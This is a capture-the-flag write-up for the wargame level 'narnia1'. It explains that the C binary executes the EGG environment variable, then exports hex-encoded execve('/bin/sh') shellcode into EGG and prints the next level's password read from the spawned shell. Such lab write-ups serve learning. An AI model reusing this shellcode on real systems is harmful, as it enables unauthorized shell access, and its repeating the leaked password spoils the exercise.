# narnia1
slopey112 - 3/5/19

Taking a look at the binary, the solution is pretty much given.
```
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```
It seems we'll have to create an environmental variable named `EGG`, and, per nomenclature, execute shell code. (Haha, get it?)

Taking a look at the source code reaffirms our suspicions.
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
The code is very simple; provided that `EGG` exists, it executes it. So all we have to do is provide the necessary shell code. That's not difficult.

We'll use our [trusty shell code](http://shell-storm.org/shellcode/files/shellcode-811.php) and make that into an enviromental variable.
```
narnia1@narnia:/narnia$ export EGG=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
```
And when we execute the binary again, we get a root shell.
```
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ cd /etc/narnia_pass
$ ls
narnia0  narnia1  narnia2  narnia3  narnia4  narnia5  narnia6  narnia7	narnia8  narnia9
$ cat narnia2
nairiepecu
```
